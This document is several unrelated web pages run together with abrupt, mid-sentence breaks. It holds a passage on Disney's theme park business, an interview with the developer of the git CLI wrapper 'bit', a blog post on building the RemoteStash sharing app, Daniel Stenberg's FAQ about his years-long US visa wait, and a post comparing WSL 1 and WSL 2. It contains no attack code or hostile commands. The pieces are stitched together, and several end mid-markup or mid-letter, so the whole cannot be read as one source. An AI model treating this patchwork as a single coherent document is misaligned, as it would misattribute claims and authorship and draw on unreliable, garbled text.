already generates nearly three times the revenue AND three times the gross <em>margins </em>as its primary competitors). By turning hit films into theme park attractions, not only does Disney generate more “upside” from a hit than its competitors do, Disney’s breakeven point for these films is also much lower. But the parks are much more than this direct financial benefit. There is nothing that can compare to the impact of a child being hugged by her heroes. The ability to enjoy your favorite IP as “you” is unique and lasts a lifetime. Consider, for example, how many families have Disneyland photos of their kids with Mickey or Woody on the fridge. Or how many of these kids have kept those photos decades later (and compared them to their eventual spouse’s version of that same photo).</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1583704876360_17902"><div>

</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1583704876360_24796"><div><p>And because of real estate scarcity, lengthy build times, enormous capital requirements (exacerbated by<a href="http://en.wikipedia.org/wiki/Baumol's_cost_disease"> Baumol’s Cost Disease</a>), Disney’s theme parks, resorts, and cruises are incredibly difficult to replicate by another Western media company. It would take twenty years and tens of billions of dollars for AT&amp;T/WarnerMedia to receive permits, design attractions, and build a fully operational theme park, for example (and it’d probably be in the middle of nowhere). It’s especially hard to imagine all of this occurring while the company is investing tens of billions per year into HBO Max, new 5G network infrastructure, and maintenance capex (while also sustaining tens of billions in dividends and debt service, and fending off agitated investors). Comcast/Universal has an ambitious plan to grow its parks footprint, including new resorts in Russia, South Korea, and Singapore. However, these will take years and tens of billions of dollars. Purely comping the number of parks also overlooks the scale differential. Disney’s Orlando resort, for example, is over 25,000 acres (half used). Universal Studios Orlando is barely 500. In addition, Disney operates four cruise ships (another three are due by 2023), while no competitor does. Overall, Disney’s theme parks business generates more than $26B per year with 175MM+ visitors, compared to 6B for Universal Studios, with 50MM.</p><p>However, the defensibility and value of these businesses goes beyond physical and financial barriers to entry; running a successful theme park means far more than designing a fun ride. Giving real hugs to kids is incredibly dangerous — doing this reliably, safely, and positively millions of times per year requires enormous training (the parks also operate hospitals, pet day care and police services, too!). In addition, these parks must cater to a wide variety of different customers with different needs, physical capabilities, and developmental maturity. In contrast, a film or TV show has only one version that lasts forever and is infinitely repeatable with 100% consistency. There is no other “medium” in the entertainment industry that requires melding more art forms (e.g. live performance, set design, music, engineering) with a smaller margin for error, and at such a great scale. The benefit, though, is a rich, hard to replicate and intimate understanding of the consumer.</p><p>The competitive consequences are profound and only growing. Fans simply cannot enjoy DC or Lord of the Rings or Dragon Ball the way they do Disney’s Princesses, Pixar, most recently, Star Wars, and soon, the Avengers franchises. This fundamentally limits a franchise’s ability to grow love — the lifeblood (and profit driver) of all IP-based companies.</p></div></div><div data-block-type="5" id="block-yui_3_17_2_1_1583703445914_105588"><div>

</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1583703445914_134473"><div><p>This is why brands like 20th Century Fox and WarnerMedia license their theme park IP from super-popular brands like <em>Avatar</em>, <em>The Simpsons</em>, and <em>Harry Potter</em> to their competitors, Disney and Universal. Nintendo also partnered with Universal for its theme park rights. This extension is strategically important and financially valuable, but it’s also quite costly. The rights owner, for example, neither owns the customer relationship nor do they deliver the end-customer experience (in a weird way, Universal has a closer relationship with <em>Harry Potter</em> fans than WarnerMedia does). In addition, the majority of associated profits go to the park operator — who also gets to intermingle their IP and draft off the popularity of their competitors’ franchises, too. That’s risky in an age where franchises and <a href="https://www.matthewball.vc/all/disneylessons">clarity of franchise ownership is key</a>.</p><p>So, as we embrace the digital era, it’s funny to consider the enduring and durable significance of the analogue theme parks business. It is incredibly profitable and will continue to grow as new mobile technology/personalization enhance the park-going experience. The barriers to replication are incredibly high and span both fixed investment (land and infrastructure) and skillset (e.g. design and boots-on-the-ground operations). It also offers an intimate understanding of the consumer, is particularly potent when connected to an IP flywheel, and is able to constantly renew its appeal through new attractions and updates.</p><p><span><strong><em>Chapter Two: The (Start of the) New Theme Parks</em></strong></span></p><p>These parks exist and thrive because of our desire to be “inside a living story”. This was Walt’s primary goal with Disneyland: to go beyond passive consumption and into active immersion. Consider the following quote from one of Disney’s chief Imagineers: </p><blockquote><p><em>“Disneyland is an experience involving many moving parts in harmony, like an orchestra. Everything has to be tuned, what you hear, what you smell, what you see, how you see it, the speed at which you assimilate all of that, just like a film, is choreographed. But how do you choreograph that if you don't control the camera, because the camera is you — it's you when you come to Disneyland".</em></p></blockquote><p>This idea of agency is key. There’s only so much time one can spend in a physical or virtual world as a pre-defined character. That doesn’t mean we want to remain an exact replica of our “IRL” selves — we might want to be taller, or blue, or metal, and so on. But when you’re <em>specifically </em>Iron Man, there are limits to what you can look like, how you can behave, what you can do or be, where you can go, and how long it makes sense to be there. After all, you can’t actually be Iron Man, just pretend to be. And certainly, it doesn’t make sense if all of your friends are all Iron Man, too.</p></div></div><div data-block-json="{&quot;cache_age&quot;:&quot;3153600000&quot;,&quot;authorUrl&quot;:&quot;https://twitter.com/DonaldMustard&quot;,&quot;width&quot;:550,&quot;resolveObject&quot;:&quot;Tweet&quot;,&quot;html&quot;:&quot;<blockquote class=\&quot;twitter-tweet\&quot;><p lang=\&quot;en\&quot; dir=\&quot;ltr\&quot;>In Fortnite you will always be you.

    <p><em>This interview was hosted by Jackson Kelley from Console originally posted <a href="https://console.substack.com/p/console-23">here</a></em></p>
<h3 id="what-is-your-background">What is your background?</h3>
<p>I was born and raised in NY. I started off with the privilege of working as an intern at Google. I then moved on to working in FinTech, InsurTech, and now Construction Tech (ConstruTech?). I enjoy my fair share of table tennis and gaming. (Fun fact: I once reached the #1 rank on the StarCraft 2 ladder (2v2s))</p>
<p>My first foray into programming was in High School. I took a computer science intro course and made some cool things like a flash game where each sprite was a meme from Reddit rage comics. However, I didn’t feel confident in my programming abilities and ended up majoring in Accounting instead. I quickly realized that Accounting was not for me 😅 and switched to Finance. Halfway through college, I started reading about programming and it “clicked”. I began experimenting with Android programming (Shout out to <a href="https://www.amazon.com/Android-Programming-Ranch-Guide-Guides/dp/0321804333">The Big Nerd Ranch Guide</a>) and never stopped coding since then. You can check out my old Flappy Bird inspired Android game <a href="https://play.google.com/store/apps/details?id=com.walz.joltimate.downfall2&amp;hl=en_US">here</a>. All in all, I graduated with a B.S. in Finance and a minor in Computer Science.</p>
<p>My favorite language is Go but I mostly use Java and JavaScript during work. I try to steer away from using frameworks when I can but I like the Go web framework Echo. I use React + Redux although I’ve come to realize over time that Redux is overused and leads to too much global state.</p>
<h3 id="why-do-you-try-to-avoid-frameworks">Why do you try to avoid frameworks?</h3>
<p>Frameworks tend to have magic which can be convenient but also frustrating to work with when you want more customization or you’re dealing with a nasty bug which turns out to be the framework silently undermining you. This is not to say that you shouldn’t use frameworks and it goes on a case by case basis.  Frameworks are usually “high level” and hide details. This is convenient but if you’re simply seeking to learn how to code this may not be beneficial.</p>
<p>Libraries are easier to wrap your head around since it will only do something if you explicitly tell it to do so. In turn, one can more easily rule out whether a bug is due to a library for example. The whole system of a computer operates like this to an extent. There are applications built to run on an operating system that runs commands on the kernel which in turn interfaces with the hardware. This system of components and layers is only possible due to API’s/Libraries.</p>
<h3 id="why-was-bit-started">Why was bit started?</h3>
<p>Bit is the summation of a passion for UX, laziness, and a healthy frustration with git’s CLI. Git’s CLI, as many of its users know, has a plethora of commands and options. When you multiply out all the combinations of commands by the number of options and their potential parameters you get A LOT of choices. On top of that, there’s the cornucopia of jargon (detach, head, ref, commit to name a few) and abstruse know-how that, in conjunction, can seduce you into a monotonous hell hole of learning the internal workings of git. Or perhaps put another way – you begin to understand why there is a 500-page book about git. It’s worth pointing out that I like git – but I also enjoy the cathartic pleasure of poking fun at it. Much respect to Linus and all the maintainers that have brought git to where it is today.</p>
<p>So anyway… the inklings of bit began when I started asking myself why doesn’t git’s CLI do this? Why doesn’t git have an undo button? At some point, I said enough is enough, opened an editor, and started writing some code. Bit started out as this grand new git workflow that would completely change the way people would use git. Or at least that was the plan. After developing it and showing it to some friends I got the vibe that perhaps bit was too opinionated and I decided to dial back some of the changes and focus on an improved UX experience. It started all coming together – intelligent suggestions, branches sorted by most recent, proactive fast-forwarding to avoid merge conflicts and full compatibility with all git commands. A lot of this either alleviates the “maintenance” type tasks of git or helps reduce the working memory that git takes to allow you to focus more on the task at hand.</p>
<p>Bit has come a long way in such a short period of time considering the very first commit was only just over a month ago. Seeing all the overwhelmingly positive feedback is almost surreal and I’m thankful to all its supporters.  It’s even cooler working with folks across the world to make bit a bit better each day.</p>
<h3 id="are-there-any-overarching-goals-of-bit-that-drive-design-or-implementation">Are there any overarching goals of bit that drive design or implementation?</h3>
<p>Ease. Of. Use. I love simple interfaces (Google Search, Docker Run, the “Easy Button”).  Google Docs is a powerful interface as well (albeit not quite as simple). It does some complex work behind the scenes such as automatic saving, automatic synchronization &amp; distribution, automatic versioning (yes, Google Docs does that as well). It made me wonder how those principles can be applied to version control.  This became the inspiration for the <code>bit sync</code> command.</p>
<p>Put the onus on the program, not the user. Some of bit’s naysayers claim that higher-order commands (e.g. bit sync, git pull) take away from the user’s understanding. Personally, I find that to be a rather weak argument. Abstractions are powerful. Small interfaces are better than large ones. Bit allows you to use all git commands anyway so the trade-off is mitigated in this way.</p>
<h3 id="what-is-the-most-challenging-problem-thats-been-solved-in-bit-so-far">What is the most challenging problem that’s been solved in bit so far?</h3>
<p>There have been many challenges:  creating a uniform experience across Operating Systems and Shells,  implementing tab completion, displaying fast interactive prompts, simple installs, and lastly learning lots about git itself 😅. I’d say the biggest challenge I solved(ish) is marketing! Marketing is hard. Even harder for programmers. I posted all over the internetz. Reddit, Discord, Twitter, StackOverflow, and even got my first couple of Stars via a link from another Github repo. Of course, Hacker News was the most successful, hitting #2 on the front page. Interestingly, the first time I posted it fell by the wayside with a measly 5 points 🤷‍♂️. All of this marketing took a lot of time and consideration to get the messaging right on the posts and the landing page (Github README). Not to mention the worry that it’d all be for naught.</p>
<h3 id="is-bit-intended-to-eventually-be-monetized-if-it-isnt-monetized-already">Is bit intended to eventually be monetized if it isn’t monetized already?</h3>
<p>Git is free and open-source so I feel it is only right to continue forward in that spirit and keep bit free and open-source.</p>
<p><a href="https://github.com/sponsors/chriswalz">Donations</a> are welcome though (wink, wink)!</p>
<h3 id="where-do-you-see-bit-heading-next">Where do you see bit heading next?</h3>
<p>Continued innovation of the UX. Polishing the small details that “delight the user.” The dream goal would be to make such an impact that Git’s CLI UX itself would improve due to the success of bit. Another interesting avenue would be bit aliases that could be written in Go. I hope bit inspires future developers about how the CLI experience, in general, can be improved. I think <a href="https://fishshell.com/">Fish</a> is doing great work on this front (I had the pleasure of discovering it during my research for bit).  I look forward to the continuing innovation of the shell/CLI space.</p>
<h3 id="where-do-you-see-software-development-in-general-heading-next">Where do you see software development, in general, heading next?</h3>
<p>Tough question! There are many possibilities considering how quickly innovation happens nowadays. My instinct tells me “No-Code” and “Low-Code” solutions will become increasingly common. Perhaps it will be more visually based where a designer literally draws out a system and an AGI figures out the details (or vice-versa). Maybe even further into the future we will all be hooked up to a Neuralink and code will just spew out of our brains and then we’ll all understand why there’s a programming language called Brain****.</p>
<h3 id="where-do-you-see-open-source-heading-next">Where do you see open-source heading next?</h3>
<p>I’m rather new to open-source so take my thoughts with a grain of salt. Open-source appears to have a bright future. There seems to be a need for continued innovation around licensing to prevent companies from taking advantage of open-source projects.</p>
<p>GitHub introduced Sponsoring is a fantastic way to <a href="https://github.com/sponsors/community">give back</a> to the open-source community.</p>
<p>I think there should be significantly more financial support for projects. It’s unfortunate to see so many projects stop getting maintained over time considering how fundamental they are to companies, big and small. Perhaps implementing some sort of government open-source Incentive program that encourages businesses to donate to open-source projects would make open-source flourish even more.</p>
<p>Also, bringing more attention to open-source through what Console is doing is really great to see.</p>
<h3 id="what-is-one-question-you-would-like-to-ask-another-open-source-developer-that-i-didnt-ask-you">What is one question you would like to ask another open-source developer that I didn’t ask you?</h3>
<p>How do you go about resolving an issue (specifically bugs) that a user files?</p>
<h3 id="what-is-the-best-way-for-a-new-developer-to-contribute-to-bit">What is the best way for a new developer to contribute to bit?</h3>
<p>Submitting issues &amp; pull requests is nice. Also, changes to the README is quite useful (even with all the fallout from Hacktoberfest!). Look at the <a href="https://github.com/chriswalz/bit/issues">issues</a> page and look for “good first issue” labels. Also, if you feel like you <a href="https://en.wikipedia.org/wiki/Impostor_syndrome">don’t know what you’re doing</a> – don’t worry, no one does 😛.</p>

<p>I mostly work and play within the Apple ecosystem and <a href="https://support.apple.com/en-gb/HT204144">AirDrop</a>, <a href="https://support.apple.com/en-gb/HT204681">Continuity</a> and other integration between devices is extremely useful and convenient. <a href="https://llguy.github.io/">My son</a> recently converted himself to Linux and started to miss the ability to easily move photos, text, or url between his phone and his Linux computer. Being a hacker himself, he thought it would be a great idea to devise an app that let’s you move information from your phone to your computer, and more generally a “cross platform AirDrop substitute for geeks”…</p>



<p>Of course, one solution would be to <a href="http://www.google.com/search?q=how+to+airdrop+to+linux">google</a> and figure out if such an app exists, but where is the fun in that? We decided to take on a Father-Son new project and build our own solution. </p>



<p>The result ended up surprisingly useful, we made it open-source, you can find the <a href="https://github.com/roznet/remotestash">working code here</a> and the <a href="https://apps.apple.com/us/app/remotestash/id1516090251?ls=1">app on the store</a>. As we learned a few new technologies along the way, we decided to write about the approach as hopefully it could be useful to other.</p>



<p>In this first part, we’ll go over the overall approach, then the iPhone Application implementation and finally the python implementation on the computer.</p>



<h2>The Philosophy</h2>



<p>My son’s philosophy being “anything beyond using a <a href="https://en.wikipedia.org/wiki/Network_socket">socket API</a> and crafting your own network packets would be too high level”, he started writing some <a href="https://en.wikipedia.org/wiki/C_(programming_language)">C code</a>, building his own protocol, communicating with a cloud server he rents on <a href="https://www.digitalocean.com/">Digital Ocean</a> with his weekly allowance.</p>



<p>I wanted to take the opportunity to show him how to leverage higher level libraries even languages like python to get the desired result quickly. We targeted to get a proof of concept, including learning the require component within one week-end. No choice but to leverage existing frameworks…</p>



<p>The philosophy of the tool would be on the phone to be as user friendly and natively integrated to the phone system as possible. On the computer it would be natural for a linux geek, command line based and loosely inspired by some of the <code>git</code> concept of <code>pull</code>, <code>push</code> and <code>stash</code>. No fancy UI and definitely no mouse. Using the mouse is probably more of an heresy for my son that using a high-level library. He lives in the terminal, emacs and the i3 tile window manager. We would also try to be as generic as possible on the items that could be shared, images, text, files, but start with the basic he needed: text, url and photos.</p>



<h2>The Approach</h2>



<p>We needed to decide on three core components: how to store and track the items to be shared – the stash, how the devices would discover each other on the network and how to share the actual items on the network across devices</p>



<h3>stash</h3>



<p>We needed to keep that simple. No database or anything complex, we went for a linux like approach of keeping a dot directory in the home of the user where the supporting files would be kept as well as the actual items themselves saved as files.</p>



<h3>discovery</h3>



<p>The gold standard for service discovery seems to be <a href="https://en.wikipedia.org/wiki/Zero-configuration_networking#Apple_Bonjour">Bonjour or ZeroConf</a>. It appears to have started as an Apple technology, but is a standard used by most device these days. A quick review of the docs showed that it was exactly what we needed. Enables discovery of devices services on the network and we should share small payload of information as well. And of course it was multi-platform with convenient library in the Apple iOS development environment and python.</p>



<h3>Sharing</h3>



<p>The most obvious approach to share files between devices seem to be using http/https. Widely supported, easy to debug with many existing tools and of course it supports all kind of format that we needed. python and iOS have great support to do requests and good libraries to implement simple servers. One issue was that on iOS, an app needs to use the https protocol, but a quick search lead to a great little library to implement a server that supports https on iPhone called <a href="https://criollo.io/">Criollo.</a></p>



<h2>Last Missing Pieces</h2>



<p>Before we could really start, two major pieces remained to be agreed: the name and the icon!</p>



<p>Again two philosophies and two contenders for the name. The teen cool factor approach: <code>Galactic Clipboard</code> or the middle-age practical and plain one: <code>Remote Stash</code>. Because I was quicker to create the GitHub repo and I control our Apple Developer account for the App, I won with <a href="https://github.com/roznet/remotestash">RemoteStash</a>…</p>



<p>The Icon was less contentious. Turns out a teen living in an emacs and terminal environment is less interested in icons, so I quickly put one together</p>



<div><figure><img loading="lazy" width="150" height="150" src="https://i0.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x-150x150.png?resize=150%2C150&amp;ssl=1" alt="" srcset="https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?resize=150%2C150&amp;ssl=1 150w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?resize=300%2C300&amp;ssl=1 300w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?resize=1024%2C1024&amp;ssl=1 1024w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?resize=768%2C768&amp;ssl=1 768w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?resize=1536%2C1536&amp;ssl=1 1536w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?w=2048&amp;ssl=1 2048w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?w=1168&amp;ssl=1 1168w, https://i2.wp.com/ro-z.net/blog/wp-content/uploads/2020/06/App-Icon-Main-1024x1024@2x.png?w=1752&amp;ssl=1 1752w" sizes="(max-width: 150px) 100vw, 150px" data-recalc-dims="1"></figure></div>



<p>Next we’ll look how we implemented the iPhone app before looking at the python script</p>



<p>But first you can see a video demo of the tool</p>

<p> Time it took for Daniel to get a US visa </p>
<p><span>
 937 days
</span></p><p> Background </p>
<p>
 On June 26th 2017, Daniel was denied to travel to the US - while still having
 a valid ESTA and passport. He was then denied ESTA on April 3, 2018. When
 subsequently applying for a visa instead, there has been no response for over
 two years. (To <i>visit</i>, not to apply for permanent residency.)

<p>
<a href="#got-it">Visa approved</a>
</p><div>
<p>
 937 days since my application, I have a visa in my passport. Valid for 10 years.
</p><p> As an unexpected bonus, there's also a 30 days "NIE" (National Interest
 Exception) that allows me a single entry to the US during "PP" (Presidential
 Proclamations) - which is restricting travels to the US from the European
 Schengen zone.
</p></div>
<p>
<a href="#parcel">"There's a package being delivered to you"</a>
</p><div>
<p>
 934 days into the process (10:30 November 6, 2020) I received this
 text on my phone, saying there's a parcel sent to me from "the
 Embassy of the United State".
</p><p>
<img src="https://daniel.haxx.se/media/embassy-text.png" width="600">
</p></div>
<p>
<a href="#send-in">Please send in your passport</a>
</p><div>
<p> On October 13, 2020 (910 days in), the embassy emailed me again,
asking me to "Please send in your passport for further processing."
</p><p> On October 16, I mailed it to the embassy.
</p></div>
<p>
<a href="#plans">Updated travel plans please!</a>
</p><div>
<p> On September 22, 2020 (889 days in), the US Embassy emailed me, and I will
quote verbatim from the email below.
</p><pre>Dear Sir,
&nbsp;
Your visa application is still in administrative processing. However, we regret to
inform you that because you have missed your travel plans, we will require updated
travel plans from you. If you intend to proceed with your visa application, we
therefore ask you to kindly send your updated travel plans, including any relevant
supporting documents (such as  an official invitation letter and financial support
letter/other financial supporting documents). Thank you.
</pre>
<p> So I need to provide updated plans and "invitation letters"...
</p><p> It seems reasonable to suspect that the embassy woke up and realized this
 after having being prodded by the <a href="#officials">congressman's
 email</a> a few days ago. The travel plans have been outdated for the last
 800 days or so and they only email to ask this now?
</p><p> On October 2, 220 (898 days in) I responded to the email with an
 invitation letter with an offer to visit my colleagues at wolfSSL in the US
 at two different future dates (one in December 2020, one in March 2021) and
 "All expenses, hotel, airfare, transportation and food will be paid for him".
 Signed by Larry Stefonic, CEO of wolfSSL.

<p> No. They've just informed me "someone is working on it" and that it "may
take a long time" but without qualifying what that means. They call it
"administrative processing."
</p><p> I have talked to several persons who've experienced similar situations, and
  I have learned about waiting times up to 20 months until a definite "no". I used
  to think of that as a sort of "worst case" waiting time. Now we know it can
  take longer...
</p></div>
<p>
<a href="#esta">Why don't you just apply for an ESTA?</a>
</p><p>
  I already did and they denied me that. See one of the <a href="#images">images below</a>.
</p>
<p>
Why did they deny you ESTA?
</p><p>
  I don't know as they won't tell. And I also don't know why they can't respond to my visa application.
</p>
<p>
<a href="#working">So, someone is working on it?</a>
</p><p>
  Allegedly, yes. I'm sure that person must be working very hard...
</p>
<p>
<a href="#eventually">Do you think they will grant you a visa eventually?</a>
</p><div>
<p>
  No. I have been in contact with many people who have been in similar
  situations such as this, as well as many people who have applied for visas
  for very complicated matters, and it is basically unheard of that it would
  take this long time and still end up with a positive response in the end.
</p><p>
  Someone emailed me and explained how they got their visa approved after 10
  months waiting - so it obviously <i>can</i> happen after a fairly
  long time!
</p></div>
<p>
<a name="#arab">Did you travel to any arab countries, middle-east, North Korea, Sudan, Iran or Iraq?</a>
</p><p>
 No.
</p>
<p>
<a name="#ever">Did you ever visit the US?</a>
</p><div>
<p> Yes, I have visted the US around a dozen times over a time period of almost
 twenty years. I have applied and gotten ESTA permissions several times. I have
 many friends living and working in the US.
</p><p> My latest visit to the US was in December 2016 - using the same ESTA and
 passport I subsequently wanted to use in the summer of 2017 when I was first
 denied travelling to the US.
</p></div>
<p>
<a href="#blocked">How many trips have this blocked you from taking so far?</a>
</p><div>
<p> I have been invited personally to several meetings in the US that I couldn't
 attend. (excluding IETF, HTTPbis or QUIC meetings)
</p><ol>
<li> San Francisco June 2017. Mozilla All Hands.
</li><li> San Francisco June 2018. Mozilla All hands.
</li><li> San Francisco October 2018. Conference speaking engagement.
</li><li> Orlando, Florida December 2018. Mozilla All hands.
</li><li> Portland, Oregon January 2019. Conference speaking engagement.
</li><li> California, March 2019. Conference speaking engagement.
</li><li> Summer of 2019. Wedding.
</li></ol>
</div>
<p>
<a href="#employer">Can't your employer help you?</a>
</p><p> We've already tried all available ways to get information or otherwise
bring this effort forward. To no avail.
</p>
<p>
<a href="#Mozilla">Will Mozilla move more meetings outside of the US?</a>
</p><p> Yes. Several of the coming All hands are now planned and scheduled to
happen outside of the US, for example in Canada and Germany. But I will not be
there to experience them since I quit Mozilla in December 2018.
</p>
<p>
Will your visa situation change when you've quit Mozilla?
</p><p> Unfortunately, there is no reason to suspect or hope so.
</p>
<p>
<a href="#lost">Maybe they lost your application?</a>
</p><div>
<p> I emailed them in July 2019 just to make sure they just hadn't
 forgot about my case or similar over the past year, and I received their
 reply on August 1st 2019. The response said "I have forwarded your email to
 my supervisor to highlight the problem."  - but then nothing more came.
</p><p> I emailed them again on January 28, 2020.<br>
<img src="https://daniel.haxx.se/media/651-days-email.png">
</p><p>
 They responded very politely:
 </p><pre>Dear Sir,
&nbsp;
All applications are processed in the most expeditious manner
possible. While we understand your frustration, we are required to follow
immigration law regarding visa issuances. This process cannot be expedited or
circumvented. Rest assured that we will contact you as soon as the
administrative processing is concluded.
</pre>
</div>
<p>
<a href="#likely">What do you think is the most likely explanation for this treatment?</a>
</p><div>
<p> I think one of the likelier explantions is that someone somewhere has
 found my name and my code used in some evil or malicious manner and drawn the
 wrong conclusions about how my code ended up there or how I could've been
 involved. Like for example in some malware, virus or other attack software. I
 make tools and code available for free and openly and sometimes those are
 unfortunately used in ways I don't condone.
</p><p> Since they won't tell me why, basically all theories are equally likely.
 We just won't know.
</p></div>
<p>
Any other plausible explanations?
</p><div>
<p> People have mentioned my domain name <b>haxx.se</b> or suggested it is
because I have referred to myself as "a hacker" at times. I find that unlikely
since I used the domain and used the term for decades before this.
</p><p> Others have offered the explanation that the immigration authorities
might've decided that I violated the ESTA rules in a previous visit. I can of
course not know what they think, but I have not violated those rules.
</p></div>
<p>
<a href="#crime">Convicted of a crime?</a>
</p><p>
No, I have never been convicted of a crime in Sweden and not anywhere
else. Not even charged. Nor have I ever been involved in a lawsuit of any
kind.
</p>
<p>
<a href="#license">Can you change the curl license?</a>
</p><div><p>
Lots of people suggest this, most probably in jest, but let me be perfectly
clear: no I won't change the curl license.
</p><ol>
 <li> excluding a specific user would make a license to not be open source anymore
 </li><li> curl has many more copyrights than mine, it would be hard
 </li><li> curl is bigger than me personally, I wouldn't do it anyway
</li></ol>
</div>
<p>
<a href="#covid">But Covid-19?</a>
</p><p>
During the Corona pandemic (starting in spring 2020), the US has closed its
borders for a lot of more people who otherwise would have been allowed
entry. I suspect the visa processing has slowed down during this period since
people can't go there anyway. But I have not been notified about anything and
I still expect to get a rejection at some point. Pandemic or not.
</p>
<p>
<a href="#officials">Have you contacted any US officials?</a>
</p><div><p>
A US citizen friend of mine sent the following text in an email to the
U.S. Congressman Gerry Connolly on September 3, 2020.
</p><pre>Dear Representative Gerry Connolly:
&nbsp;
Could you please help my friend Daniel Stenberg *finally* gain permission to
travel to the US? He has been denied permission to travel to the US for years,
yet there is no cause for it.
&nbsp;
On June 26, 2017, Mr. Stenberg was denied to travel to the US, even though he
had a valid ESTA and passport. He was then denied ESTA on April 3, 2018. He
then applied for a visa in April 2018, and has *still* not heard anything.
&nbsp;
This is especially galling because is a widely-known leader in the computer
community. He developed and maintains the "curl" program, a program used
worldwide by many software developers and computer system administrators. In
October 2017 he won the "Polhem prize" for his work on curl; in that ceremony
the Swedish king personally handed Daniel a gold medal. In February 2019 he
joined wolfSSL, an American company (he's their only Swedish hire), and yet
he's still not allowed to travel to the US.
&nbsp;
Perhaps there is a confusion about the word "hacker". In the computer
community, a "hacker" is NOT someone who breaks into computers, a hacker
is "a person who delights in having an intimate understanding of the
internal workings of a system, computers and computer networks in
particular."  ( IETF RFC 1983, https://tools.ietf.org/html/rfc1983).

Mr. Stenberg does *not* break into computers without authorization.
&nbsp;
At the least, the State Department should have asked questions instead of
reflexively denying entry to a world leader in the computer industry.
&nbsp;

            <div>
              
              <article><p>If you have followed Windows 10 at all during the last few years, you know that the <strong>Windows Subsystem for Linux</strong>, or <strong>WSL</strong> for short, is <em>the</em> hot topic among developers. You can finally run your Linux tooling on Windows as a first class citizen, which means you no longer have to learn PowerShell or, god forbid, suffer through the ancient <code>CMD.EXE</code> console.</p>
<p>Unfortunately, not everything is as rosy as it sounds. I now have to do development <em>on</em> Windows <em>for</em> Windows as part of my new role within Azure… and the fact that WSL continues to be separate from the native Windows environment shows. Even though I was quite hopeful, I cannot use WSL as my daily driver because I need to interact with “native” Windows tooling.</p>
<p>I believe things needn’t be this way, but with the recent push for WSL 2, I think that the potential of an alternate world is now gone. But what do I mean with this? For that, we must first understand the differences between WSL 1 and WSL 2 and how the push for WSL 2 may shut some interesting paths.</p>
<p><strong>DISCLAIMER:</strong> I have zero insight on what’s going on within the WSL team or what their future plans are. This is purely my personal opinion based on what I have experienced as a user.</p>

<p>Let’s first take a look at WSL 1, and for that, we must look at what’s in the awkward name. Why was this feature named Windows subsystem… <em>for</em> Linux? Isn’t that backwards? This is not a subsystem in Linux to do anything Windows-related; it’s the other way around!</p>
<p>Well… you see, the name is technically correct when considering the design of the Windows NT kernel. From the <a href="https://en.wikipedia.org/wiki/Architecture_of_Windows_NT">Architecture of Windows NT</a> page in the Wikipedia, we find (emphasis mine):</p>
<blockquote>
<p>User mode in Windows NT is made of subsystems capable of passing I/O requests to the appropriate kernel mode device drivers by using the I/O manager. <strong>The user mode layer of Windows NT is made up of the “Environment subsystems”, which run applications written for many different types of operating systems</strong>, and the “Integral subsystem”, which operates system-specific functions on behalf of environment subsystems. The kernel mode stops user mode services and applications from accessing critical areas of the operating system that they should not have access to.</p>
</blockquote>
<p>Windows NT was designed from the ground up to support running processes from a multitude of operating systems, and Win32 was “just” one of those environment subsystems. With these solid foundations, WSL 1 supplies a new environment subsystem, the Linux subsystem, to run Linux binaries atop the Windows NT kernel. Both the Win32 and Linux environment subsystems share the common integral subsystem.</p>
<p>Mumble jumbo. What does any of that actually mean?</p>
<p>Different system call “front-ends”—that’s what it means. A user-space process is a collection of binary instructions that the processor executes uninterruptedly (leaving interrupts aside). The operating system’s kernel is unaware of what the process is doing until the process issues a system call: at that point, the kernel regains control to perform an operation on behalf of the user, which can be something like reading a file or pausing for a few seconds.</p>
<p>The way a process issues system calls, and the semantics of those system calls, are specific to the operating system. For example, on old x86: opening a file on Win32 is system call number <code>17h</code> invoked via <code>INT 2Eh</code> whereas opening a file on Linux is system call number <code>5h</code> invoked via <code>INT 80h</code>.</p>
<p>But… conceptually, opening a file is opening a file, right? The fact that the system call numbers or the software interrupt numbers are different among them is not particularly interesting. And hereby lies the key design aspect of WSL 1: the Linux subsystem in the NT kernel is, simply put, an implementation of Linux’s system call layer in front of the NT kernel. These system calls later delegate to NT primitives, <em>not</em> Win32 calls. Which is important to repeat: there is no translation from Linux to Win32 system calls.</p>
<p>This is a feat of engineering considering how generally good support for Linux apps got to be under WSL 1 and the many ways in which NT internally differs from Unix, <code>fork+exec</code> being the eternal archenemy.</p>
<p>The true beauty of this design is that there is a single kernel running on the machine, and this kernel has a holistic view of all the processes beneath it. The kernel knows everything about the Win32 <em>and</em> Linux processes. And these processes all interact with unified resources, such a single networking stack, a single memory manager, and a single process scheduler.</p>

<p>If WSL 1 is so cool, then why does WSL 2 exist? Two reasons:</p>
<ul>
<li>WSL 1 has to, essentially, implement all of Linux’s kernel ABI, “bit by bit”. If there is a bug in that interface, the WSL 1 has to replicate it. And if there is a feature that is difficult to represent within the NT kernel, either the feature cannot be implemented or it needs extra kernel logic (and thus becomes slower).</li>
<li>Linux subsystem in WSL 1 has to abide by any “limitations” and inherent differences that exist between the NT kernel and the traditional Unix design. The most obvious one is the NTFS file system and its semantics, and how these differences harm performance of Linux binaries. Poor file system performance seems to be a common complaint in WSL 1.</li>
</ul>
<p>WSL 2 “throws away” all of the Linux subsystem parts of the name and replaces everything with a full-blown (but very well-hidden and fast) virtual machine. The virtual machine then runs a proper Linux kernel, a proper Linux file system, and a proper Linux networking stack within it.</p>
